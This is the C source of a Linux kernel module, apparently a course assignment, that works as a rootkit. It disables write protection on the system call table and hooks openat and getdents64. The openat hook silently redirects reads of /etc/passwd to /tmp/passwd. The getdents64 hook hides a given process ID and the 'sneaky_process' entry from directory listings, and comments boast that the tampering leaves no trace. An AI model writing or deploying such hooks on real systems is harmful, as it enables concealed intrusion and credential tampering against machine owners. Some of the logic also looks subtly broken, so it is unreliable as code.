#include <linux/module.h> // for all modules
#include <linux/init.h>   // for entry/exit macros
#include <linux/kernel.h> // for printk and other kernel bits
#include <asm/current.h>  // process information
#include <linux/sched.h>
#include <linux/highmem.h> // for changing page permissions
#include <asm/unistd.h>    // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>

#define PREFIX "sneaky_process"
#define TEMPASS "/tmp/passwd"
#define ETCPASS "/etc/passwd"

// static int pid;
// module_param(pid, int, 0);
char *pid = NULL;
module_param(pid, charp, 0);

// This is a pointer to the system call table
static unsigned long *sys_call_table;
// hello from new vm
// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr)
{
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW)
  {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr)
{
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).

asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  char *path_name = (char *)regs->si;
  if (strcmp(path_name, ETCPASS) == 0)
  {
    copy_to_user(path_name, TEMPASS, strlen(TEMPASS) + 1);
    printk(KERN_INFO "open at attack!");
  }
  return (*original_openat)(regs);
}

asmlinkage int (*original_getdents64)(struct pt_regs *regs);

asmlinkage int sneaky_getdents64(struct pt_regs *regs)
{
  struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
  struct linux_dirent64 *cur_dirent;
  struct linux_dirent64 *next_dirent;
  int nread = (*original_getdents64)(regs);
  int offset = 0;
  int remaining_size;

  printk(KERN_INFO "get sneaky getdents64 with process id %s", pid);
  // error or nothing to read
  if (nread <= 0)
  {
    return 0;
  }

  while (offset < nread)
  {
    cur_dirent = (void *)dirp + offset;
    if ((strcmp(cur_dirent->d_name, pid) == 0) || (strcmp(cur_dirent->d_name, PREFIX) == 0))
    {
      next_dirent = (void *)cur_dirent + cur_dirent->d_reclen;
      remaining_size = nread - (offset + cur_dirent->d_reclen);
      memmove(cur_dirent, next_dirent, remaining_size);
      nread -= cur_dirent->d_reclen;
    }

    offset += cur_dirent->d_reclen;
  }
  return nread;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
  //  You need to replace other system calls you need to hack here

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void)
{
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading
MODULE_LICENSE("GPL");
